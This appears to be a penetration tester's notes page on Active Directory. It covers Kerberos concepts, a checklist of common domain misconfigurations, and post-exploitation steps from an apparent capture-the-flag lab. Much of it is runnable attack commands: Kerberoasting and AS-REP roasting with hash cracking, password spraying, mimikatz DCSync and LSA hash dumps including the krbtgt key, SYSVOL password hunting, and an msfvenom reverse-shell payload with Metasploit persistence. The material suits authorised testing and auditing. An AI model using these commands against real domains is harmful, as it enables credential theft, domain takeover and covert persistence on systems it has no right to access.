# Active directory run-ins

Active Directory is the directory service for Windows Domain Networks. Active Directory allows for the control and monitoring of computers through a single domain controller. It allows a single user to sign in to any computer on the active directory network and have access to his or her stored files and folders in the server, as well as the local storage on that machine. This allows for any user in the company to use any machine that the company owns, without having to set up multiple users on a machine. Active Directory does it all.

* Active Directory is very complex and securing it requires significant effort and years of experience. 
* It is used by many companies and is a vital skill to comprehend when attacking Windows.

The Active Directory structure includes three main tiers: 1) domains, 2) trees, and 3) forests. Several objects (users or devices) that all use the same database may be grouped in to a single domain. Multiple domains can be combined into a single group called a tree. Multiple trees may be grouped into a collection called a forest. Each one of these levels can be assigned specific access rights and communication privileges.

## Main concepts of an Active Directory

* Directory – Contains all the information about the objects of the Active directory
* Object – An object references almost anything inside the directory (a user, group, shared folder...)
* Domain – The objects of the directory are contained inside the domain. Inside a "forest" more than one domain can 
exist and each of them will have their own objects collection.
* Tree – Group of domains with the same root. Example: dom.local, email.dom.local, www.dom.local
* Forest – The forest is the highest level of the organisation hierarchy and is composed by a group of trees. The 
trees are connected by trust relationships.

Active Directory provides different services, which fall under the umbrella of Active Directory Domain Services (AD DS):

* Domain Services – stores centralised data and manages communication between users and domains; includes login authentication and search functionality
* Certificate Services – creates, distributes, and manages secure certificates
* Lightweight Directory Services – supports directory-enabled applications using the open (LDAP) protocol
* Directory Federation Services – provides single-sign-on (SSO) to authenticate a user in multiple web applications in a single session
* Rights Management – protects copyrighted information by preventing unauthorised use and distribution of digital content
* DNS Service – Used to resolve domain names.

AD DS is included with Windows Server (including Windows Server 10) and is designed to manage client systems. While 
systems running the regular version of Windows do not have the administrative features of AD DS, they do support 
Active Directory. This means any Windows computer can connect to a Windows workgroup, provided the user has the 
correct login credentials.

## Attack scenario

1. Scan the network
2. No credentials/sessions
   * Enumerate DNS (for example, with gobuster)
   * Enumerate LDAP
   * Poison the network (Responder; Relay attack; Evil-SSDP)
   * OSINT
3. Valid username but no passwords
   * ASREPRoast
   * Password spraying
4. With credentials/sessions
   * CMD
   * powershell
   * powerview
   * Bloodhound

## Kerberos authentication

The Kerberos protocol is not a Microsoft invention, but Microsoft integrated their version of Kerberos in Windows2000, 
and it is now replacing NT Lan Manager (NTLM), which was a challenge-response authentication protocol.

Kerberos uses stronger encryption, which improves the security as compared to NTLM. 

## Transport layer

Kerberos uses UDP or TCP as transport protocol, which sends data in cleartext. Kerberos is responsible for providing 
encryption. Ports used by Kerberos are UDP/88 and TCP/88.

## Agents

The agents working together to provide authentication in Kerberos:

* Client or user who wants to access to the service.
* Application Server (AP) which offers the service required by the user.
* Key Distribution Center (KDC), responsible for issuing the tickets, installed on the Domain Controller (DC). It is 
supported by the Authentication Service (AS), which issues the TGTs.

## Encryption keys

There are several tickets. Many of those structures are encrypted or signed in order to prevent being tampered by 
third parties. 

* KDC or krbtgt key, which is derived from the krbtgt account NTLM hash.
* User key, derived from user NTLM hash.
* Service key, derived from the NTLM hash of the service owner, which can be a user or computer account.
* Session key, which is negotiated between the user and KDC.
* Service session key to be used between user and service.

## Tickets

Tickets are delivered to users for enabling actions in the Kerberos realm:

* The Ticket Granting Service (TGS) is the ticket for authenticating with a service. It is encrypted with the service 
key.
* The Ticket Granting Ticket (TGT) is the ticket presented to the KDC to request a TGSs. It is encrypted with the KDC 
key.

## PAC

The Privilege Attribute Certificate (PAC) is included in almost every ticket. It contains the privileges of the user 
and is signed with the KDC key. Services can verify the PAC by communicating with the KDC (does not happen often) by 
checking its signature. What is not verified is whether privileges inside the PAC are correct. And a client can avoid 
the inclusion of the PAC inside the ticket by specifying it in the `KERB-PA-PAC-REQUEST` field of the ticket request.

## Messages

![Kerberos](/_static/images/kerberos.png)

1. KRB-AS-REQ - The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).
2. KRB-AS-REP - The Key Distribution Center verifies the client and sends back an encrypted TGT.
3. KRB-TGS-REQ - The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal 
Name (SPN) of the service the client wants to access. 
4. KRB-TGS-REP - The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the 
service, then sends a valid session key for the service to the client. 
5. KRB-AP-REQ - The client requests the service and sends the valid session key to prove the user has access. 
6. KRB-AP-REP - The service grants access

## Kerberos tickets overview 

The main ticket that you will see is a ticket-granting ticket. These can come in various forms such as a `.kirbi` 
for Rubeus, `.ccache` for Impacket. A ticket is typically base64 encoded and can be used for various attacks. 

* A normal TGT will only work with the given service.
* A KRBTGT allows for getting any service ticket, in turn allowing access to anything on the domain.

## Attack privilege requirements

* Kerbrute Enumeration - No domain access required 
* Pass the Ticket - Access as a user to the domain required
* Kerberoasting - Access as any user required
* AS-REP Roasting - Access as any user required
* Silver Ticket - Service hash required 
* Golden Ticket - Full domain compromise (domain admin) required
* Skeleton Key - Full domain compromise (domain admin) required

## Active directory vulnerabilities

The most commonly found vulnerabilities, unordered, just as checklist.

### Users having rights to add computers to domain

In a default installation of Active Directory, any domain user can add workstations to the domain, as defined by the 
`ms-DS-MachineAccountQuota` attribute (default = 10). This means that any low privileged domain user can join up to 
10 computers to the domain. 

This setting allows any user to join an unmanaged computer (like BYOD) to access the corporate domain:

* No Antivirus or EDR solution is pushed onto their machine
* No GPO settings or policies apply to their system
* Allows them having Administrative rights on their system

PowerShell command:

    add-computer –domainname <FQDN-DOMAIN> -Credential <domain>\<username> -restart –force

List all computers that were added by non-admins:

    Import-Module ActiveDirectory
    Get-ADComputer -LDAPFilter "(ms-DS-CreatorSID=*)" -Properties ms-DS-CreatorSID

### AdminCount attribute set on common users

The `AdminCount` attribute in Active Directory is used to protect administrative users and members of privileged 
group such as Domain Admins, Enterprise Admins, Schema Admins, Backup Operators, Server Operators, Replicator, etc.

When the `AdminCount` attribute is set to 1 automatically when a user is assigned to any privileged group, but is 
never automatically unset when the user is removed from these group(s), common low privileged users with AdminCount 
set to 1 without being members of any privileged group exist.

Collect information from the domain controller:

    python ldapdomaindump.py -u <domain>\\<username> -p <password> -d <DELIMITER> <DC-IP>

Instead of a password, the NTLM hash can also be used (pass-the-hash).

Get the list of users with `AdminCount` attribute set to 1 by parsing the `domain_users.json` file:

    jq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json

With access to domain controllers, get a list of users:

    Import-Module ActiveDirectory
    Get-AdObject -ldapfilter "(admincount=1)" -properties admincount

### High number of users in privileged groups

An excessive number of users in privileges groups such as Domain Admins, Schema Admins and Enterprise Admins. 
If some of those get compromised, the entire domain is compromised.

From a low privileged domain account on a joined Windows machine, enumerate these groups from a domain:

    net group "Schema Admins" /domain
    net group "Domain Admins" /domain
    net group "Enterprise Admins" /domain

From a non-joined Windows machine, authenticate to the domain first:

    runas /netonly /user:<domain>\<username> cmd.exe

From Linux (Kali Linux) using the `net` command:

    net rpc group members 'Schema Admins' -I <DC-IP> -U "<username>"%"<password>"
    net rpc group members 'Domain Admins' -I <DC-IP> -U "<username>"%"<password>"
    net rpc group members 'Enterprise Admins' -I <DC-IP> -U "<username>"%"<password>"

### Service accounts are members of Domain Admins

A service account is to designate a specific user account with specific set of privileges to run a specific service 
(or application), without requiring to provide it with full administrative privileges.

Service accounts typically have passwords set to never expire, their passwords are rarely changed, and when get 
compromised, allows attackers full control over the AD domain, for a long time.

See "High number of users in privileged groups" above for ways to test.

### Excessive privileges shadow Domain Admins

Misuse of Active Directory Rights and Extended Rights - Access Control Entries (ACEs), such as: 

* ForceChangePassword – Ability to reset password of another user
* GenericAll – Full control over an object (read/write)
* GenericWrite – Update of any attributes of an object
* WriteOwner – Assume ownership of an object
* WriteDacl – Modify the DACL of an object
* Self – Arbitrarily modify self

Users with such excessive privileges are thus called shadow Domain Admins (or Hidden Admins). To look for these rights 
and trust misconfigurations, `bloodhound` is an excellent tool.

#### Bloodhound

1. First use an `ingestor` to collect the data from the AD environment.
2. Upload the data into the Bloodhound front-end GUI to visualise relations between objects.
3. Start with the [pre-built queries](https://raw.githubusercontent.com/BloodHoundAD/BloodHound/e17462cf50422bfe9572e60390d32479fdbc32c4/src/components/SearchContainer/Tabs/PrebuiltQueries.json).
4. Add some [custom-built queries](https://raw.githubusercontent.com/porterhau5/BloodHound-Owned/master/customqueries.json).

### Service accounts vulnerable to Kerberoasting

Kerberoasting is a very common attack vector aimed against service accounts with weak passwords and when there is 
weak Kerberos RC4 encryption used for encrypting passwords.

This attack has been automated by Impacket and Rubeus all that is required is low privileged domain user credentials.

#### Impacket

    GetUserSPNs.py -request <domain>/<username>:<password>

Instead of a password, an NTLM hash can be used (pass-the-hash). If some hashes are given, there are service accounts 
vulnerable to Kerberoasting. The hashes can be exported to, for example, a `hashcat.txt` file and fed to hashcat for 
a dictionary attack:

    hashcat -m 13100 -a 0 hashes.txt wordlist.txt

### Users with non-expiring passwords

Some organisations have domain accounts configured with the `DONT_EXPIRE_PASSWORD` flag set. A typical setting for 
service accounts, and making vulnerable when set on more privileged domain accounts. High privileged domain accounts 
with non-expiring passwords are ideal targets for privilege escalation attacks and are common "backdoor" users for 
maintaining access by APT groups.

Collect information from the domain controller:

    python ldapdomaindump.py -u <domain>\\<username> -p <password> -d <DELIMITER> <DC-IP>

Get the list of users with non-expiring passwords:

    grep DONT_EXPIRE_PASSWD domain_users.grep | grep -v ACCOUNT_DISABLED | awk -F ';' '{print $3}'

Or use PowerShell on a domain controller to get the list of such users:

    Import-Module ActiveDirectory
    Get-ADUser -filter * -properties Name, PasswordNeverExpires | where { $_.passwordNeverExpires -eq "true" } | where {$_.enabled -eq "true" }

### Users with password not required

If a user account has the `ASSWD_NOTREQD` flag set, the account doesn’t have to have a password. It means that any 
kind of password will be just fine – a short one, a non-compliant one (against domain password policy), or an empty one.

Use low privileged domain user credentials and the ability to reach LDAP port of any domain controller.

Collect information from the domain controller:

    python ldapdomaindump.py -u <domain>\\<username> -p <password> -d <DELIMITER> <DC-IP>

Get the list of users with the `PASSWD_NOTREQD` flag:

    grep PASSWD_NOTREQD domain_users.grep | grep -v ACCOUNT_DISABLED | awk -F ';' '{print $3}'

Or use PowerShell on a domain controller to get the list of such users:

    Import-Module ActiveDirectory
    Get-ADUser -Filter {UserAccountControl -band 0x0020}

### Storing passwords using reversible encryption

Some applications require a user's password in plain text for authentication and this is why there 
is support for storing passwords using reversible encryption in Active Directory.

And why (perhaps) mitigations are in place which require an attacker to have to pull password data from the domain 
controllers in order to read the password in plain text. This means to have either:

* Rights to perform DCSYNC operation (Mimikatz)
* Access to the NTDS.DIT file on a domain controller

Both methods imply a full AD domain compromise already.

#### Mimikatz

Using Mimikatz in the context of a high privileged user (who is able to perform DCSYNC), and knowing the username of 
an affected user:

    mimikatz # lsadump::dcsync /domain:<domain> /user:<AFFECTED-USER>

### Storing passwords using LM hashes

Another vulnerability that typically surfaces after the Active Directory compromise is the storage of passwords as 
LM hash, instead of NTLM.

After dumping `ntds.dit` and 
[extracting Hashes and Domain Info From ntds.dit](https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/), 
identify LM hashes:

    grep -iv ':aad3b435b51404eeaad3b435b51404ee:' dumped_hashes.txt

### Service accounts vulnerable to AS-REP roasting

[Roasting AS-REPs](https://blog.harmj0y.net/activedirectory/roasting-as-reps/) is similar to Kerberoasting, but in 
this case the attack abuses user accounts with `DONT_REQ_PREAUTH` flag set.

To test for AS-REP roasting, knowing domain user credentials is not needed. We donneed to know is which users are affected.

If we do not know any, we can try a wordlist with usernames with Impacket:

    GetNPUsers.py <domain>/ -usersfile <USERLIST.TXT> -format [hashcat|john] -no-pass

If we do have low privileged domain user credentials, we can get the list of affected users with their Kerberos 
AS-REP hashes:

    GetNPUsers.py <domain>/<username>:<password> -request -format [hashcat|john]

If we get some hashes, we can try to crack the AS-REP hashes with hashcat using a dictionary attack:

    hashcat -m 18200 -a 0 hashes.txt wordlist.txt

Or use PowerShell on a domain controller to get the list of users which do not require Kerberos pre-authentication:

    Import-Module ActiveDirectory
    Get-ADuser -filter * -properties DoesNotRequirePreAuth | where {$._DoesNotRequirePreAuth -eq "True" -and $_.Enabled -eq "True"} | select Name

### Weak domain password policy

Some organisations enforce long and complex passwords, changing them frequently, others do not enforce strong password 
parameters and instead focus on strengthening compensatory controls in the internal environments, so that an account 
compromise has very little impact. Each approach has its advantages and disadvantages.

#### net

Display AD password policy from a domain joined Windows machine with low priviliges:

    net accounts /domain

#### polenum

Display AD password policy from Linux (Kali Linux) using `polenum`:

    polenum --username <username> --password <password> --domain <DC-IP>

#### enum4linux

Display AD password policy from Linux (Kali Linux) using `enum4linux`:

    enum4linux -P -u <username> -p <password> -w <domain> <DC-IP>

### Inactive domain accounts

Vulnerabilities caused by active user accounts without being used for a long time (according to their 
`Last logon date`) typically belong to employees that left the company, temporary accounts, and test accounts. This 
increases the attack surface for login attacks.

Collect information from the domain controller:

    python ldapdomaindump.py -u <domain>\\<username> -p <password> -d <DELIMITER> <DC-IP>

Sort the users based on their last logon date:

    sort -t ';' -k 8 domain_users.grep | grep -v ACCOUNT_DISABLED | awk -F ';' '{print $3, $8}'

### Privileged users with password reset overdue

Having high privileged and administrative users configured with one password for a very long time, are likely targets 
for attackers (APTs).

Collect information from the domain controller:

    python ldapdomaindump.py -u <domain>\\<username> -p <password> -d <DELIMITER> <DC-IP>

Get the list of users with `AdminCount` attribute set to 1 by parsing the `domain_users.json` file:

    jq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json > privileged_users.txt

Iterate through the list of privileged users, display last password reset date (pwdLastSet) and sort:

    while read user; do grep ";${user};" domain_users.grep; done < privileged_users.txt | \
    grep -v ACCOUNT_DISABLED | sort -t ';' -k 10 | awk -F ';' '{print $3, $10}'

### Users with a weak password

Even with a strong corporate password policy and security-aware mature environment, there can still be domain accounts 
with weak passwords.

Get a list of users from the AD using PowerShell on a domain joined Windows machine:

    $a = [adsisearcher]”(&(objectCategory=person)(objectClass=user))”
    $a.PropertiesToLoad.add(“samaccountname”) | out-null
    $a.PageSize = 1
    $a.FindAll() | % { echo $_.properties.samaccountname } > users.txt

Feed into DomainPasswordSpray.ps1 (PowerShell module), Invoke-BruteForce.ps1 (PowerShell module), 
Metasploit smb_login scanner, Nmap ldap-brute NSE script, CrackMapExec, Medusa, Ncrack, Hydra.

####  AD login bruteforcer

Password spraying with [minimalistic AD login bruteforcer](https://www.infosecmatter.com/minimalistic-ad-login-bruteforcer/):

    Import-Module ./adlogin.ps1
    adlogin users.txt domain.com password123

#### Metasploit

Get a list of AD domain users using the `net` command:

    net rpc group members 'Domain Users' -I <DC-IP> -U "<username>"%"<password>"

Do the login attack:

    use auxiliary/scanner/smb/smb_login
    set RHOSTS <DC-IP>
    set SMBDomain <domain>
    set SMBPass file:pwdlist.txt
    set USER_FILE users.txt
    set THREADS 5
    run

### Credentials in SYSVOL

Credentials are stored in `SYSVOL` network share folders, which are folders on domain controllers accessible and 
readable to all authenticated domain users. examples are:

* Group Policy Preferences (GPP) with cPassword attribute (MS14-025)
* Hard-coded credentials in various scripts and configuration files

From a domain joined Windows machine:

    findstr /s /n /i /p password \\\\<domain>\sysvol\<domain>\*

From Linux (Kali Linux):

    mount.cifs -o domain=<domain>,username=<username>,password=<password> //<DC-IP>/SYSVOL /tmp/mnt
    grep -ir 'password' /tmp/mnt

A cPassword attribute in the GPP XML files, for example, can be decrypted with `gpp-decrypt`.
And chances are the password will be reused somewhere.

## Post exploitation basics

![Bloodhound](/_static/images/bloodhound.png)

1. Enumeration with Powerview
2. Enumeration with Bloodhound
3. Dumping hashes with mimikatz
4. Golden ticket attacks with mimikatz
5. Maintaining Access

### Enumeration with Powerview

ssh into machine:

    ssh Administrator@<MACHINE-IP>
    Administrator@<MACHINE-IP>'s password: 

    Microsoft Windows [Version 10.0.17763.737]

Start Powershell: `-ep` bypasses the execution policy of powershell

    controller\administrator@DOMAIN-CONTROLL C:\Users\Administrator>powershell -ep bypass
    Windows PowerShell
    Copyright (C) Microsoft Corporation. All rights reserved.

Start PowerView:

    PS C:\Users\Administrator> . .\Downloads\PowerView.ps1
    PS C:\Users\Administrator> cd .\Downloads

Enumerate the domain users:

    PS C:\Users\Administrator\Downloads> Get-NetUser | select cn
    
    --
    Administrator
    Guest
    krbtgt
    Machine-1
    Admin2
    SQL Service
    POST{P0W3RV13W_FTW}
    sshd

Enumerate the domain groups:

    PS C:\Users\Administrator\Downloads> Get-NetGroup -GroupName *admin*
    Administrators
    Hyper-V Administrators
    Storage Replica Administrators
    Schema Admins
    Enterprise Admins
    Domain Admins
    Key Admins
    Enterprise Key Admins
    DnsAdmins

Enumerate shares:

    PS C:\Users\Administrator\Downloads> Invoke-ShareFinder
    \\Domain-Controller.CONTROLLER.local\ADMIN$     - Remote Admin
    \\Domain-Controller.CONTROLLER.local\C$         - Default share
    \\Domain-Controller.CONTROLLER.local\IPC$       - Remote IPC
    \\Domain-Controller.CONTROLLER.local\NETLOGON   - Logon server share
    \\Domain-Controller.CONTROLLER.local\Share      -
    \\Domain-Controller.CONTROLLER.local\SYSVOL     - Logon server share

Enumerate operating systems running inside the network:

    PS C:\Users\Administrator\Downloads> Get-NetComputer -fulldata | select operatingsystem*
    
    operatingsystem                  operatingsystemversion
    ---------------                  ----------------------
    Windows Server 2019 Standard     10.0 (17763)
    Windows 10 Enterprise Evaluation 10.0 (18363)
    Windows 10 Enterprise Evaluation 10.0 (18363)

### Enumeration with Bloodhound

    powershell -ep bypass 
    . .\Downloads\SharpHound.ps1
    Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip

Transfer the loot to attackerbox and load in bloodhound. Map the network.

### Dumping hashes with mimikatz

    cd Downloads && mimikatz.exe
    privilege::debug
    lsadump::lsa /patch
    hashcat -m 1000 <hash.text> usr/share/wordlists/rockyou.txt

### Golden ticket attacks with mimikatz

    cd Downloads && mimikatz.exe
    privilege::debug
    lsadump::lsa /inject /name:krbtgt

### Maintaining Access

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe

Transfer the payload from your attacker machine to the target machine and `use exploit/multi/handler`,
then execute the binary this will give a meterpreter shell back in metasploit. Background it.

    use exploit/windows/local/persistence
    set session 1

